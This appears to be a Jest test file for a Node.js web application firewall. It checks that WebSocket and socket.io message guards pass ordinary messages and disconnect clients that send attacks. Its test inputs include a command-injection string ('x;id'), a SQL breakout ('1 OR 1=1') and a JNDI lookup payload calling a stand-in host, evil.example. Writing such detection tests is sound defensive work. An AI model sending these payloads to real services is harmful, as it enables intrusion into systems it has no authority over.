const { EventEmitter } = require('events');
const { guardSocketIo, guardWebSocketServer, inspectMessage } = require('../lib/webSocketGuard');
const aiwaf = require('../index');

// Stand-ins with the shapes the ws and socket.io servers have.
function wsServer() {
  const wss = new EventEmitter();
  wss.connect = url => {
    const socket = new EventEmitter();
    socket.closed = null;
    socket.close = (code, reason) => { socket.closed = { code, reason }; };
    const received = [];
    wss.emit('connection', socket, { url });
    socket.on('message', data => received.push(String(Array.isArray(data) ? Buffer.concat(data) : data)));
    return { socket, received };
  };
  return wss;
}

test('ws: ordinary messages reach handlers, an attack closes the socket with 1008', async () => {
  const warn = jest.fn();
  const wss = wsServer();
  await guardWebSocketServer(wss, { logger: { warn } });
  const { socket, received } = wss.connect('/chat?room=1');
  socket.emit('message', Buffer.from('hello there'), false);
  socket.emit('message', Buffer.from(JSON.stringify({ q: "O'Reilly" })), false);
  socket.emit('message', Buffer.from('x;id'), false);
  socket.emit('message', Buffer.from('after close'), false);
  socket.emit('close');
  expect(received).toEqual(['hello there', '{"q":"O\'Reilly"}']);
  expect(socket.closed).toEqual({ code: 1008, reason: 'aiwaf' });
  expect(warn).toHaveBeenCalledWith({ event: 'aiwaf.websocket', mode: 'block', path: '/chat', rule: 'rce_command_injection' });
  expect(JSON.stringify(warn.mock.calls)).not.toContain('x;id');
});

test('ws: monitor passes and logs, off checks nothing, and too large closes with 1009', async () => {
  const warn = jest.fn();
  const monitored = wsServer();
  await guardWebSocketServer(monitored, { AIWAF_SQL_INJECTION_MODE: 'monitor', logger: { warn } });
  const one = monitored.connect('/ws');
  one.socket.emit('message', [Buffer.from('1 OR '), Buffer.from('1=1')], false);
  expect(one.received).toEqual(['1 OR 1=1']);
  expect(warn).toHaveBeenCalledWith(expect.objectContaining({ mode: 'monitor', rule: 'sql_breakout_numeric' }));
  const off = wsServer();
  await guardWebSocketServer(off, { AIWAF_SQL_INJECTION_MODE: 'off' });
  const two = off.connect('/ws');
  two.socket.emit('message', Buffer.from('x;id'), false);
  expect(two.received).toEqual(['x;id']);
  const small = wsServer();
  await guardWebSocketServer(small, { AIWAF_PAYLOAD_MAX_BYTES: 16, logger: { warn() {} } });
  const three = small.connect('/ws');
  three.socket.emit('message', new Uint8Array(Buffer.from('a'.repeat(100))).buffer, false);
  expect(three.socket.closed.code).toBe(1009);
  expect(() => guardWebSocketServer(wsServer(), { AIWAF_SQL_INJECTION_MODE: 'strict' })).rejects.toThrow();
});

test('socket.io: events are checked as JSON, and an attack disconnects', async () => {
  const io = new EventEmitter();
  const warn = jest.fn();
  await guardSocketIo(io, { logger: { warn } });
  const socket = { handshake: { url: '/socket.io/?EIO=4' }, middleware: [], disconnected: false,
    use(fn) { this.middleware.push(fn); }, disconnect() { this.disconnected = true; } };
  io.emit('connection', socket);
  const send = packet => new Promise(resolve => socket.middleware[0](packet, resolve));
  expect(await send(['chat', { text: 'hello' }, () => {}])).toBeUndefined();
  const error = await send(['chat', { text: '${jndi:ldap://evil.example/a}' }]);
  expect(error.message).toBe('rce_jndi_lookup');
  expect(socket.disconnected).toBe(true);
  expect(warn).toHaveBeenCalledWith({ event: 'aiwaf.websocket', mode: 'block', path: '/socket.io/', rule: 'rce_jndi_lookup' });
  const monitor = new EventEmitter();
  await guardSocketIo(monitor, { AIWAF_SQL_INJECTION_MODE: 'monitor', logger: { warn() {} } });
  const watched = { handshake: {}, middleware: [], use(fn) { this.middleware.push(fn); }, disconnect() {} };
  monitor.emit('connection', watched);
  expect(await new Promise(resolve => watched.middleware[0](['x', 'x;id'], resolve))).toBeUndefined();
  expect(await guardSocketIo(io, { AIWAF_SQL_INJECTION_MODE: 'off' })).toBe(io);
});

test('one message can be checked directly, and the package exports the guards', async () => {
  await require('../lib/wasmChecks').load();
  expect(inspectMessage('x;id')).toMatchObject({ rule: 'rce_command_injection', status: 403 });
  expect(inspectMessage('hello')).toBeNull();
  expect(inspectMessage({ a: 1 })).toBeNull();
  const cyclic = {};
  cyclic.self = cyclic;
  expect(inspectMessage(cyclic)).toEqual({ rule: 'payload_inspection_limit', status: 413 });
  expect(aiwaf.guardWebSocketServer).toBe(guardWebSocketServer);
  expect(aiwaf.guardSocketIo).toBe(guardSocketIo);
  expect(aiwaf.inspectMessage).toBe(inspectMessage);
});

describe('real servers', () => {
  const http = require('http');
  const WebSocket = require('ws');
  const { Server } = require('socket.io');
  const ioClient = require('socket.io-client');
  const listen = server => new Promise(resolve => server.listen(0, '127.0.0.1', () => resolve(server.address().port)));

  test('ws: messages reach the handler until an attack closes the socket with 1008', async () => {
    const server = http.createServer();
    const wss = new WebSocket.Server({ server });
    const warn = jest.fn();
    await guardWebSocketServer(wss, { logger: { warn } });
    const seen = [];
    wss.on('connection', socket => socket.on('message', data => { seen.push(String(data)); socket.send(`got ${data}`); }));
    const port = await listen(server);
    try {
      const client = new WebSocket(`ws://127.0.0.1:${port}/chat`);
      const replies = [];
      client.on('message', data => replies.push(String(data)));
      await new Promise(resolve => client.on('open', resolve));
      client.send('hello there');
      await new Promise(resolve => client.once('message', resolve));
      const closed = new Promise(resolve => client.on('close', code => resolve(code)));
      client.send(JSON.stringify({ q: '${jndi:ldap://evil.example/a}' }));
      expect(await closed).toBe(1008);
      expect(seen).toEqual(['hello there']);
      expect(replies).toEqual(['got hello there']);
      expect(warn).toHaveBeenCalledWith({ event: 'aiwaf.websocket', mode: 'block', path: '/chat', rule: 'rce_jndi_lookup' });
    } finally {
      wss.close();
      server.close();
    }
  });

  test('socket.io: events reach handlers until an attack disconnects the client', async () => {
    const server = http.createServer();
    const io = new Server(server);
    await guardSocketIo(io, { logger: { warn() {} } });
    const seen = [];
    io.on('connection', socket => socket.on('chat', (data, ack) => { seen.push(data); if (ack) ack('ok'); }));
    const port = await listen(server);
    const client = ioClient(`http://127.0.0.1:${port}`, { transports: ['websocket'], reconnection: false });
    try {
      await new Promise(resolve => client.on('connect', resolve));
      expect(await client.emitWithAck('chat', { text: "O'Reilly" })).toBe('ok');
      const gone = new Promise(resolve => client.on('disconnect', reason => resolve(reason)));
      client.emit('chat', { text: 'x;id' });
      expect(await gone).toBe('io server disconnect');
      expect(seen).toEqual([{ text: "O'Reilly" }]);
    } finally {
      client.close();
      io.close();
      server.close();
    }
  });
});
